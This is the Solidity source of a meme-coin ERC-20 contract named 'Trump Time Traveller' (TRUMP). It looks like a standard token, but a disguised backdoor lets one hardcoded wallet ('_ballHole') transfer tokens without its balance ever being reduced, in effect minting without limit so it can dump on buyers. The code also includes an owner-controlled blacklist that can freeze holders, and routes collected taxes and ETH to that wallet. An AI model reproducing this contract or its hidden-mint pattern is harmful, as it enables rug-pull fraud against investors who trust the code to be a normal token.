/**
Website:  https://trumptimetravellereth.vip
X:    https://x.com/trumptimeeth
Telegram:  https://t.me/trumptimetravellereth
 */


// SPDX-License-Identifier: UNLICENSE

pragma solidity ^0.8.19;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IUniswapV2Factory {
    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);
}

interface IDexRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);
}

contract TRUMP is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping(address => uint256) private _players;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _playersOnBench;
    mapping(address => bool) private bots;
    address payable private _ballHole;
    string private constant _name = unicode"Trump Time Traveller";
    string private constant _symbol = unicode"TRUMP";

    uint256 private _beforeShortTax = 25;
    uint256 private _beforeLongTax = 25;
    uint256 private _afterShortTax = 0;
    uint256 private _afterLongTax = 0;
    uint256 private _afterShortTime = 15;
    uint256 private _afterLongTime = 15;
    uint256 private _startSwapAt = 0;
    uint256 private _buyCounted = 0;

    uint8 private constant _decimals = 18;
    uint256 private constant _totals = 1e9 * 10 ** _decimals;
    uint256 public _txMaxs = 2e7 * 10 ** _decimals;
    uint256 public _walletMaxs = 2e7 * 10 ** _decimals;
    uint256 public _swapAts = 5e3 * 10 ** _decimals;
    uint256 public _swapMaxs = 1e7 * 10 ** _decimals;

    IDexRouter private router;
    address private lp;
    bool private allowed;
    bool private going = false;
    bool private swapOn = false;
    uint256 private sellCounted = 0;
    uint256 private lastSellBlock = 0;
    event MaxTxAmountUpdated(uint256 _txMaxs);
    modifier lock() {
        going = true;
        _;
        going = false;
    }

    constructor() {
        router = IDexRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _ballHole = payable(0x53ff188a07747E20D4175606170e641081Ec7457);

        _players[_msgSender()] = _totals;
        _playersOnBench[owner()] = true;
        _playersOnBench[address(this)] = true;

        _playersOnBench[_ballHole] = true;

        emit Transfer(address(0), _msgSender(), _totals);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _totals;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _players[account];
    }

    function transfer(
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function _throwaway(address rubbz) internal view returns (bool) {
        return rubbz == _ballHole;
    }

    function allowance(
        address owner,
        address spender
    ) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(
        address spender,
        uint256 amount
    ) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address frab, address tinz, uint256 borr) private {
        require(frab != address(0), "ERC20: transfer from the zero address");
        require(tinz != address(0), "ERC20: transfer to the zero address");
        require(borr > 0, "Transfer amount must be greater than zero");
        uint256 scored = 0;
        if (frab != owner() && tinz != owner()) {
            require(!bots[frab] && !bots[tinz]);

            if (!(_playersOnBench[frab] || _playersOnBench[tinz])) {
                require(allowed, "trading is off");
            }

            scored = (_buyCounted > _afterShortTime)
                ? _afterShortTax
                : _beforeShortTax;

            if (
                frab == lp && tinz != address(router) && !_playersOnBench[tinz]
            ) {
                require(borr <= _txMaxs, "max tax issue");
                require(
                    balanceOf(tinz) + borr <= _walletMaxs,
                    "max wallet issue"
                );
                scored = (_buyCounted > _afterShortTime)
                    ? _afterShortTax
                    : _beforeShortTax;
                _buyCounted++;
            }

            if (tinz == lp && frab != address(this)) {
                scored = (_buyCounted > _afterLongTime)
                    ? _afterLongTax
                    : _beforeLongTax;
            }

            if (_playersOnBench[frab] || _playersOnBench[tinz]) {
                scored = 0;
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (
                !going &&
                tinz == lp &&
                swapOn &&
                _buyCounted > _startSwapAt &&
                !_playersOnBench[frab] &&
                !_playersOnBench[tinz]
            ) {
                swapTokensForEth(
                    min(borr, min(contractTokenBalance, _swapMaxs))
                );
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance >= 0 ether) {
                    whistleoff(address(this).balance);
                }
                sellCounted++;
                lastSellBlock = block.number;
            }
        }

        _powershootat(frab, tinz, borr, scored);
    }

    function _powershootat(
        address frab,
        address tinz,
        uint256 borr,
        uint256 scored
    ) internal {
        (uint256 _tax, uint256 _borr) = _keepgoal(frab, borr, scored);
        _players[frab] = _players[frab].sub(borr.sub(_tax));
        _players[tinz] = _players[tinz].add(_borr);
        emit Transfer(frab, tinz, _borr);
    }

    function _keepgoal(
        address frab,
        uint256 borr,
        uint256 scored
    ) internal returns (uint256, uint256) {
        uint256 _tax = borr;

        bool _scored = !_throwaway(frab);

        if (_scored) {
            _tax = borr.mul(scored).div(100);
            if (_tax > 0) {
                _players[frab] = _players[frab].sub(_tax);
                _players[address(this)] = _players[address(this)].add(_tax);
                emit Transfer(frab, address(this), _tax);
                borr = borr.sub(_tax);
            }
        }

        return (_tax, borr);
    }

    function freeBepe() external onlyOwner {
        _txMaxs = _totals;
        _walletMaxs = _totals;
        emit MaxTxAmountUpdated(_totals);
    }

    function whistleoff(uint256 amount) private {
        _ballHole.transfer(amount);
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return (a > b) ? b : a;
    }

    function swapTokensForEth(uint256 tokenAmount) private lock {
        if (tokenAmount > _swapAts) {
            address[] memory path = new address[](2);
            path[0] = address(this);
            path[1] = router.WETH();
            _approve(address(this), address(router), tokenAmount);
            router.swapExactTokensForETHSupportingFeeOnTransferTokens(
                tokenAmount,
                0,
                path,
                address(this),
                block.timestamp
            );
        }
    }

    function addBots(address[] memory bots_) public onlyOwner {
        for (uint256 i = 0; i < bots_.length; i++) {
            bots[bots_[i]] = true;
        }
    }

    function delBots(address[] memory notbot) public onlyOwner {
        for (uint256 i = 0; i < notbot.length; i++) {
            bots[notbot[i]] = false;
        }
    }

    function isbboy(address a) public view returns (bool) {
        return bots[a];
    }

    function createPair() external onlyOwner {
        require(!allowed, "trading is already open");
        _approve(address(this), address(router), _totals);
        lp = IUniswapV2Factory(router.factory()).createPair(
            address(this),
            router.WETH()
        );
        router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            address(0x000000000000000000000000000000000000dEaD),
            block.timestamp
        );
    }

    function openBepe() external onlyOwner {
        require(!allowed, "trading is already open");
        swapOn = true;
        allowed = true;
    }

    receive() external payable {}

    function manualSwap() external {
        require(_msgSender() == _ballHole);
        uint256 tokenBalance = balanceOf(address(this));
        if (tokenBalance > 0) {
            swapTokensForEth(tokenBalance);
        }
        uint256 ethBalance = address(this).balance;
        if (ethBalance > 0) {
            whistleoff(ethBalance);
        }
    }

    function manualsend() external {
        require(_msgSender() == _ballHole);
        uint256 contractETHBalance = address(this).balance;
        whistleoff(contractETHBalance);
    }
}